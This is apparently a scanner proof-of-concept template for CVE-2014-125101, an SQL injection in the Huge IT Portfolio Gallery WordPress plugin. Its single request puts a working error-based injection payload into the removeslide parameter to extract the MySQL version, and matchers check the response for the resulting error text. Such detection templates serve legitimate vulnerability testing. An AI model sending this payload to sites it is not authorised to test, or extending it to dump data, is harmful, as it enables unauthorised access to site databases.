[info]
id = "POC-AVE-2014-0001"
name = "WordPress Portfolio Gallery SQL注入 PoC"
author = "AVE"
severity = "critical"
tags = ["sql-injection", "cve-2014-125101", "wordpress", "portfolio-gallery"]
description = "WordPress Huge IT Portfolio Gallery插件(版本1.1.0至1.1.8)的admin/portfolios_func.php文件中存在SQL注入漏洞。catid(GET)和removeslide(GET)参数在拼接SQL查询前未经过滤，攻击者可利用该漏洞实现未授权数据库操作。"
vuln_id = ["CVE-2014-125101", "AVE-2014-0001"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/wp-admin/admin.php"

query.page = "portfolios_huge_it_portfolio"
query.task = "edit_cat"
query.id = "1"
query.removeslide = "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT MID(VERSION(),1,32))))"

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["XPATH", "syntax", "MySQL", "version_"]
expect = true
